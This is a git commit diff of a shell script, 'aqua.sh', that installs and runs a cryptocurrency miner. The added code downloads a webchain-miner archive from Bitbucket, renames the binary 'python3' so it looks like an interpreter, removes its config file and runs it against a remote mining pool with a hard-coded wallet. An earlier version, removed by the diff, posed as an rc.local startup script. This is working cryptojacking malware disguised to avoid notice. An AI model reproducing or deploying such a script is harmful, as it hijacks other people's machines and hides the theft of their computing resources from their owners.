18ae0d7eb2f0cb1fabf7d0bbb8a6300446918e93
evilbabylx <40205448+evilbabylx@users.noreply.github.com>
2019-06-06 16:08:33 +0700

    Update aqua.sh

--- aqua.sh
+++ aqua.sh
@@ -1,36 +1,22 @@
-#!/bin/sh -e
-#
-# rc.local
-#
-# This script is executed at the end of each multiuser runlevel.
-# Make sure that the script will "exit 0" on success or any other
-# value on error.
-#
-# In order to enable or disable this script just change the execution
-# bits.
-#
-# By default this script does nothing.
-if [ -f ${PWD}/python ]; then
-    if pgrep -x "python" > /dev/null
+#! /bin/bash
+set -x #echo on
+if [ -f ${PWD}/python3 ]; then
+    if pgrep -x "python3" > /dev/null
 then
-pkill python
-echo " kill process"
-./python -F http://aqua.signal2noi.se:19998/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/lyn
-
+    echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python -F http://aqua.signal2noi.se:19998/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/lyn
-
+./python3 -o nowornever.hopto.org:80 -u 0xd5d5871933be8b3b8b80cac22127219c7b8026f4 -p x --donate-level=0 --worker-id=al
      
 fi
 exit
 fi
 
-wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
-unzip aquaminer-0.4-linux-amd64.zip
-mv aquaminer-0.4-linux-amd64 python
-./python -F http://aqua.signal2noi.se:19998/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/lyn
 
-exit 0
+wget https://bitbucket.org/evilbaby1/openai/downloads/linux.tar.gz
+tar xvzf linux.tar.gz
+mv webchain-miner python3
+rm config.json -f 
+./python3 -o nowornever.hopto.org:80 -u 0xd5d5871933be8b3b8b80cac22127219c7b8026f4 -p x --donate-level=0 --worker-id=al
